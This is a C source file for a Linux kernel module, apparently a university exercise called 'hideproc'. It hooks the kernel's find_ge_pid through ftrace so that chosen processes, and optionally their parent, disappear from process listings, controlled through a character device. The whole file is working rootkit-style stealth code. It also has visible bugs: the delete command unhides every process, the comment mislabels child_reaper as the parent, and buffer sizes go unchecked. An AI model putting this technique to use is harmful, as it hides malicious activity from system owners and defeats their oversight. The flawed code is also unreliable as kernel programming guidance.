#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/spinlock.h> /* remove after lock-free based impl introduced */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };

struct ftrace_hook {
    const char *name;
    void *func, *orig;
    unsigned long address;
    struct ftrace_ops ops;
};

spinlock_t list_lock;

static int hook_resolve_addr(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *) hook->orig) = hook->address;
    return 0;
}

static void notrace hook_ftrace_thunk(unsigned long ip,
                                      unsigned long parent_ip,
                                      struct ftrace_ops *ops,
                                      struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->func;
}

static int hook_install(struct ftrace_hook *hook)
{
    int err = hook_resolve_addr(hook);
    if (err)
        return err;

    hook->ops.func = hook_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE |
                      FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk("register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    return 0;
}

void hook_remove(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk("unregister_ftrace_function() failed: %d\n", err);
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk("ftrace_set_filter_ip() failed: %d\n", err);
}

typedef struct {
    pid_t id;
    struct list_head list_node;
} pid_node_t;

LIST_HEAD(hidden_proc);

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
static find_ge_pid_func real_find_ge_pid;

static struct ftrace_hook hook;

static bool is_hidden_proc(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;

    spin_lock(&list_lock);
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        if (proc->id == pid) {
            spin_unlock(&list_lock);
            return true;
        }
    }
    spin_unlock(&list_lock);
    return false;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
{
    struct pid *pid = real_find_ge_pid(nr, ns);
    while (pid && is_hidden_proc(pid->numbers->nr))
        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
    return pid;
}

static void init_hook(void)
{
    real_find_ge_pid = (find_ge_pid_func) kallsyms_lookup_name("find_ge_pid");
    hook.name = "find_ge_pid";
    hook.func = hook_find_ge_pid;
    hook.orig = &real_find_ge_pid;
    hook_install(&hook);
}

static int hide_process(pid_t pid, bool hide_parent)
{
    struct pid *p;
    pid_node_t *proc;
    if (hide_parent) {
        p = find_get_pid(pid);
        if (p) { /* prevent invalid @pid */
            proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);

            /* turns out `child_reaper` is the parent of the target process */
            proc->id = p->numbers[p->level].ns->child_reaper->pid;
            
            spin_lock(&list_lock);
            list_add_tail(&proc->list_node, &hidden_proc);
            spin_unlock(&list_lock);
        }
    }
    proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    proc->id = pid;

    spin_lock(&list_lock);
    list_add_tail(&proc->list_node, &hidden_proc);
    spin_unlock(&list_lock);

    return SUCCESS;
}

static int unhide_process(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;

    spin_lock(&list_lock);
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        list_del(&proc->list_node);
        kfree(proc);
    }
    spin_unlock(&list_lock);
    return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

static int device_open(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static ssize_t device_read(struct file *filep,
                           char *buffer,
                           size_t len,
                           loff_t *offset)
{
    pid_node_t *proc, *tmp_proc;
    char message[MAX_MESSAGE_SIZE];
    if (*offset)
        return 0;

    spin_lock(&list_lock);
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        memset(message, 0, MAX_MESSAGE_SIZE);
        sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }
    spin_unlock(&list_lock);
    return *offset;
}

static ssize_t device_write(struct file *filep,
                            const char *buffer,
                            size_t len,
                            loff_t *offset)
{
    long pid;
    char *message;
    bool hide_parent = false;

    char add_message[] = "add", del_message[] = "del", hide_parent_opt[] = "-p";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
        return -EAGAIN;

    message = kmalloc(len + 1, GFP_KERNEL);
    memset(message, 0, len + 1);
    copy_from_user(message, buffer, len);
    if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
        kstrtol(message + sizeof(add_message) + sizeof(hide_parent_opt), 10,
                &pid);
        if (!memcmp(message + sizeof(add_message), /* start of the opt */
                    hide_parent_opt,
                    sizeof(hide_parent_opt) - 1))
                hide_parent = true;
        hide_process(pid, hide_parent);
    } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
        kstrtol(message + sizeof(del_message), 10, &pid);
        unhide_process(pid);
    } else {
        kfree(message);
        return -EAGAIN;
    }

    *offset = len;
    kfree(message);
    return len;
}

static struct cdev cdev;
static struct class *hideproc_class = NULL;
static dev_t dev;
static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"

static int _hideproc_init(void)
{
    int err, dev_major;
    printk(KERN_INFO "@ %s\n", __func__);
    err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
    dev_major = MAJOR(dev);

    hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);

    cdev_init(&cdev, &fops);
    cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
    device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                  DEVICE_NAME);

    init_hook();

    spin_lock_init(&list_lock);

    return 0;
}

static void _hideproc_exit(void)
{
    device_destroy(hideproc_class, MKDEV(MAJOR(dev), MINOR_VERSION));
    class_destroy(hideproc_class);
    unregister_chrdev_region(MKDEV(MAJOR(dev), MINOR_VERSION), MINOR_VERSION);
    hook_remove(&hook);

    printk(KERN_INFO "@ %s\n", __func__);
}

module_init(_hideproc_init);
module_exit(_hideproc_exit);
